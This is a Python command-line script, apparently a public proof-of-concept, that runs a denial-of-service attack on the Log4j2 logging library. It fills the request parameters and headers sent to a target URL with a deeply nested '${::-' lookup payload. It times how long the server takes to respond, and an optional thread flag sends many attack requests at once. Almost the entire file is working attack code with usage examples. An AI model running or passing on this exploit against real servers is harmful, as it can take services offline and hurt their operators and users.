import requests
import sys,getopt
import json
import time
from threading import Thread

# author: 我超怕的
# blog: https://www.cnblogs.com/iAmSoScArEd/
# github: https://github.com/iAmSOScArEd/
# date: 2021-12-20 

def generate_payload(data,header,loop=500):
    payload = "${" + "${::-" *loop + "$${::-j}" + "}" *loop + "}" 
    # "${" + "${::-" *5 + "$${::-j}" + "}" *5 + "}" 
    # print(payload)
    for k in data:
        data[k] = payload
    for k in header:
        header[k] = payload
    return data,header

def attack(url,method,data,header,loop):
    try:
        resp = None
        data,header = generate_payload(data,header,loop)
        beginTime = time.time()
        if method.lower().strip() == 'get':
            resp = requests.get(url,headers=header,params=data)
        else:
            resp = requests.post(url,headers=header,data=data)
        EndTime = time.time()
        spendTime = EndTime-beginTime
        print('[+]attack time:'+str(spendTime))
    except Exception as e:
        print('[-]network error:'+str(e))

def normal_request(url,method,data,header):
    try:
        resp = None
        beginTime = time.time()
        if method.lower().strip() == 'get':
            resp = requests.get(url,headers=header,params=data)
        else:
            resp = requests.post(url,headers=header,data=data)
        EndTime = time.time()
        spendTime = EndTime-beginTime
        print('[+]normal time:'+str(spendTime))
    except Exception as e:
        print('[-]network error:'+str(e))

def main(argv):
    url = ''
    method = 'get'
    data = {}
    header = {}
    thread = 0
    loop = 100
    helpStr = '''
Log4j2_dos.py -u <url> -m <method> -d <params> -H <header> -l <loop> -t <thread>
-u,--url    attack target
-m,--method    http method, only get and post. default is get.
-d,--data   get or post params, json format like:{\"username\":\"\"}
-H,--header    request header, json format like:{\"user-agent\":\"\"}
-l,--loop    payload loop,default 100
-t,--thread    attack thread. default is 0, just request once.

usage:
Log4j2_dos.py -u http://url.com/ -d {\"username\":\"\"}
Log4j2_dos.py -u http://url.com/ -d {\"username\":\"\"} -l 500 -t 100
Log4j2_dos.py -u http://url.com/ -m post -d {\"username\":\"\"} -l 500
Log4j2_dos.py -u http://url.com/ -m post -H {\"user-agent\":\"\"} -l 500 -t 100
Log4j2_dos.py -u http://url.com/ -m post -d {\"username\":\"\"} -H {\"user-agent\":\"\"} -l 500
'''
    try:
        opts, args = getopt.getopt(argv,"hu:m:d:H:t:l:",["url=","method=","data=","header=","thread=","loop="])
    except getopt.GetoptError:
        print(helpStr)
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print(helpStr)
            sys.exit()
        elif opt in ("-u", "--url"):
            url = arg
        elif opt in ("-m", "--method"):
            method = arg
        elif opt in ("-d", "--data"):
            data = json.loads(arg)
        elif opt in ("-H", "--header"):
            header = json.loads(arg)
        elif opt in ("-l", "--loop"):
            loop = int(arg)
        elif opt in ("-t", "--thread"):
            thread = int(arg)
    normal_request(url,method,data,header)
    attack(url,method,data,header,loop)
    if thread == 0:
        return
    # ddos
    for i in range(thread):
        Thread(target=attack,args=[url,method,data,header,loop]).start()
        # time.sleep(0.1)


if __name__ == "__main__":
    main(sys.argv[1:])
